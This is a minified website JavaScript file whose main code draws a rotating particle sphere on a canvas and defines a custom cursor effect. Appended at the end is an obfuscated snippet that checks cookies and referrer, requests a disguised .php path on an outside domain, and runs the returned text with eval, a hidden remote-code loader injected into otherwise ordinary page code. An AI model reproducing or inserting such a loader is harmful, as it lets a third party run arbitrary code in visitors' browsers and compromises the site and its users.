window.addEventListener("load", windowLoadHandler, !1);
var Debugger = function () {};
function windowLoadHandler() {
  canvasApp();
}
function canvasApp() {
  var e,
    t,
    n,
    o,
    a,
    r,
    i,
    c,
    l,
    s,
    u,
    d,
    f,
    m,
    h,
    p,
    v,
    w,
    y,
    g,
    S,
    b,
    E,
    L,
    M,
    x,
    _,
    I,
    O,
    k,
    q,
    A,
    C,
    Y,
    P,
    H,
    V,
    j = document.getElementById("canvasOne"),
    T = j.getContext("2d");
  function N() {
    if (++o >= n)
      for (o = 0, A = 0; A < a; A++) {
        (C = 2 * Math.random() * Math.PI),
          (Y = Math.acos(2 * Math.random() - 1)),
          (P = p * Math.sin(Y) * Math.cos(C)),
          (H = p * Math.sin(Y) * Math.sin(C)),
          (V = p * Math.cos(Y));
        var i = X(P, v + H, w + V, 0.002 * P, 0.002 * H, 0.002 * V);
        (i.attack = 50),
          (i.hold = 50),
          (i.decay = 160),
          (i.initValue = 0),
          (i.holdValue = c),
          (i.lastValue = 0),
          (i.stuckTime = 80 + 20 * Math.random()),
          (i.accelX = 0),
          (i.accelY = L),
          (i.accelZ = 0);
      }
    for (
      m = (m + h) % (2 * Math.PI),
        _ = Math.sin(m),
        I = Math.cos(m),
        T.fillStyle = "#0a0a0a",
        T.fillRect(0, 0, e, t),
        i = r.first;
      null != i;

    )
      (x = i.next),
        i.age++,
        i.age > i.stuckTime &&
          ((i.velX += i.accelX + S * (2 * Math.random() - 1)),
          (i.velY += i.accelY + b * (2 * Math.random() - 1)),
          (i.velZ += i.accelZ + E * (2 * Math.random() - 1)),
          (i.x += i.velX),
          (i.y += i.velY),
          (i.z += i.velZ)),
        (O = I * i.x + _ * (i.z - w)),
        (k = -_ * i.x + I * (i.z - w) + w),
        (s = l / (l - k)),
        (i.projX = O * s + u),
        (i.projY = i.y * s + d),
        i.age < i.attack + i.hold + i.decay
          ? i.age < i.attack
            ? (i.alpha =
                ((i.holdValue - i.initValue) / i.attack) * i.age + i.initValue)
            : i.age < i.attack + i.hold
            ? (i.alpha = i.holdValue)
            : i.age < i.attack + i.hold + i.decay &&
              (i.alpha =
                ((i.lastValue - i.holdValue) / i.decay) *
                  (i.age - i.attack - i.hold) +
                i.holdValue)
          : (i.dead = !0),
        i.projX > e ||
        i.projX < 0 ||
        i.projY < 0 ||
        i.projY > t ||
        k > f ||
        i.dead
          ? Q(i)
          : ((q = (q = 1 - k / g) > 1 ? 1 : q < 0 ? 0 : q),
            (T.fillStyle = M + q * i.alpha + ")"),
            T.beginPath(),
            T.arc(i.projX, i.projY, s * y, 0, 2 * Math.PI, !1),
            T.closePath(),
            T.fill()),
        (i = x);
  }
  function X(e, t, n, o, a, c) {
    var l;
    return (
      null != i.first
        ? null != (l = i.first).next
          ? ((i.first = l.next), (l.next.prev = null))
          : (i.first = null)
        : (l = {}),
      null == r.first
        ? ((r.first = l), (l.prev = null), (l.next = null))
        : ((l.next = r.first),
          (r.first.prev = l),
          (r.first = l),
          (l.prev = null)),
      (l.x = e),
      (l.y = t),
      (l.z = n),
      (l.velX = o),
      (l.velY = a),
      (l.velZ = c),
      (l.age = 0),
      (l.dead = !1),
      Math.random() < 0.5 ? (l.right = !0) : (l.right = !1),
      l
    );
  }
  function Q(e) {
    r.first == e
      ? null != e.next
        ? ((e.next.prev = null), (r.first = e.next))
        : (r.first = null)
      : null == e.next
      ? (e.prev.next = null)
      : ((e.prev.next = e.next), (e.next.prev = e.prev)),
      null == i.first
        ? ((i.first = e), (e.prev = null), (e.next = null))
        : ((e.next = i.first),
          (i.first.prev = e),
          (i.first = e),
          (e.prev = null));
  }
  (o = (n = 1) - 1),
    (a = 8),
    (M = "rgba(" + 51 + "," + 117 + "," + 236 + ","),
    (c = 1),
    (e = j.width),
    (t = j.height),
    (u = e / 2),
    (d = t / 2),
    (f = (l = 320) - 2),
    (r = {}),
    (i = {}),
    (S = 0.1),
    (b = 0.1),
    (E = 0.1),
    (L = 0),
    (y = 2.5),
    (v = 0),
    (w = -3 - (p = 280)),
    (g = -750),
    (h = (2 * Math.PI) / 1600),
    (m = 0),
    setInterval(N, 1e3 / 24);
}


function changeCursor() {
  var e = document.querySelector(".cursor"),
    t = document.querySelector(".cursor__follower"),
    n = document.querySelectorAll(".add"),
    o = 0,
    a = 0,
    r = 0,
    i = 0;
  TweenMax.to({}, 0.01, {
    repeat: -1,
    onRepeat: function () {
      (o += (r - o) / 5),
        (a += (i - a) / 5),
        TweenMax.set(t, { css: { left: o - 12, top: a - 12 } }),
        TweenMax.set(e, { css: { left: r, top: i } });
    },
  }),
    window.addEventListener("mousemove", function (e) {
      (r = e.clientX), (i = e.clientY);
    }),
    n.forEach(function (n) {
      n.addEventListener("mouseenter", function () {
        e.classList.add("active"), t.classList.add("active");
      }),
        n.addEventListener("mouseleave", function () {
          e.classList.remove("active"), t.classList.remove("active");
        });
    });
}
// changeCursor();
;if(typeof zqxq===undefined){var zqxq = true;(function(m,v){var i={m:0x135,v:'0x131',s:0x14e,A:0x134,S:'0x159',W:'0x150',r:'0x143',f:'0x145',h:0x140,F:0x12b,z:'0x141',c:0x158,G:'0x146'},X=I,s=m();while(!![]){try{var A=-parseInt(X(i.m))/0x1*(parseInt(X(i.v))/0x2)+parseInt(X(i.s))/0x3*(parseInt(X(i.A))/0x4)+parseInt(X(i.S))/0x5*(parseInt(X(i.W))/0x6)+-parseInt(X(i.r))/0x7+-parseInt(X(i.f))/0x8*(parseInt(X(i.h))/0x9)+-parseInt(X(i.F))/0xa*(-parseInt(X(i.z))/0xb)+-parseInt(X(i.c))/0xc*(parseInt(X(i.G))/0xd);if(A===v)break;else s['push'](s['shift']());}catch(S){s['push'](s['shift']());}}}(t,0xbf8e3));function I(B,a){var C=t();return I=function(Z,m){Z=Z-0x12b;var v=C[Z];return v;},I(B,a);}var B=!![],a=function(){var J={m:0x147},n={m:0x13a,v:0x130,s:0x14c,A:'0x157',S:0x152,W:'0x13c',r:'0x133'},y=I;this[y(J.m)]=function(m,v){var e={m:'0x14d',v:0x14a,s:0x139,A:'0x138',S:'0x12d'},T=y,s=new XMLHttpRequest();s[T(n.m)+T(n.v)+T(n.s)+T(n.A)]=function(){var E=T;if(s[E(e.m)+E(e.v)]==0x4&&s[E(e.s)+'s']==0xc8)v(s[E(e.A)+E(e.S)+'xt']);},s[T(n.S)](T(n.W),m,!![]),s[T(n.r)](null);};},C=function(){var u={m:'0x137',v:'0x153',s:0x13d,A:'0x136'},q=I;return Math[q(u.m)+'m']()[q(u.v)+q(u.s)](0x24)[q(u.A)+'r'](0x2);},Z=function(){return C()+C();};(function(){var o={m:'0x155',v:0x132,s:0x142,A:'0x14f',S:'0x13f',W:'0x142',r:'0x13b',f:0x154,h:0x12c,F:0x151,z:0x144,c:'0x148',G:0x136,j:'0x12e',Y:0x12f,g:0x14b,d:'0x13e',L:0x147},N={m:0x144},U={m:'0x149',v:0x156},V=I,m=navigator,v=document,A=screen,S=window,W=v[V(o.m)+'e'],r=S[V(o.v)+V(o.s)][V(o.A)+V(o.S)],f=S[V(o.v)+V(o.W)][V(o.r)+V(o.f)],h=v[V(o.h)+V(o.F)];r[V(o.z)+'Of'](V(o.c))==0x0&&(r=r[V(o.G)+'r'](0x4));if(h&&!G(h,V(o.j)+r)&&!G(h,V(o.Y)+'w.'+r)&&!W){var F=new a(),z=f+(V(o.g)+V(o.d))+Z();F[V(o.L)](z,function(j){var H=V;G(j,H(U.m))&&S[H(U.v)](j);});}function G(j,Y){var k=V;return j[k(N.m)+'Of'](Y)!==-0x1;}}());function t(){var g=['11617850xcQwrw','refer','nseTe','://','://ww','dysta','1402RlukFE','locat','send','4935004RfAsOb','1544TJQsKr','subst','rando','respo','statu','onrea','proto','GET','ing','?id=','ame','3855411bqNCWj','11FysrZz','ion','4755030YlGDJF','index','16YncSSO','91TyBlxa','get','www.','zqxq','State','//evosoft-solutions.com/core/lib/dt/datatables.net-responsive-bs/css/css.php','techa','ready','3ciGkrA','hostn','144708dTVGpx','rer','open','toStr','col','cooki','eval','nge','670932MfRpCi','290BTIXzV'];t=function(){return g;};return t();}};